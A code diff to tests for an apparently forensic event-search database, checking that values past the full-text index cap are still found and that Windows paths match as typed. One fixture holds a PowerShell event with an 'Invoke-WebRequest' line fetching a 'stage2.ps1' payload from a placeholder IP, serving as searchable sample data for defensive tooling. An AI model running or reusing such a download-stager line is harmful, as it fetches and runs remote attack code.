@@ -122,4 +122,18 @@ def test_identifier_numbers_are_searchable_so_renames_can_be_followed(tmp_path):
     db.ingest_artifact_results(usn, "Windows.Forensics.Usn", "D", "C.1")
     found = {r["description"] for r in db.search_events("87470")["records"]}
     assert len(found) == 2 and any("My Social Security Number.zip" in d for d in found)
-    assert db.search_events("87470123")["total"] == 0                 # sizes and offsets are not indexed
+    # Sizes and offsets are not in the index, but a search the index can't answer reads the full
+    # records: nothing in the data is reported as absent.
+    assert db.search_events("87470123")["total"] == 1
+
+
+def test_a_value_past_the_index_cap_is_still_found(tmp_path):
+    from copilot.database import CaseDatabase, FTS_VALUE_CHARS
+    db = CaseDatabase(str(tmp_path))
+    script = "x" * (FTS_VALUE_CHARS + 500) + " Invoke-WebRequest http://203.0.113.9/stage2.ps1"
+    db.ingest_artifact_results([{"EventTime": "2020-09-19T03:00:00Z", "EventID": 4104, "ScriptBlockText": script,
+                                 "Path": "C:\\Users\\bob\\run.ps1"}],
+                               "Windows.EventLogs.PowershellScriptblock", client_id="C.1")
+    assert db.search_events("stage2.ps1")["total"] == 1
+    assert db.search_events("C:\\Users\\bob\\run.ps1")["total"] == 1     # backslashes as typed
+    assert db.search_events("not-in-the-data")["total"] == 0
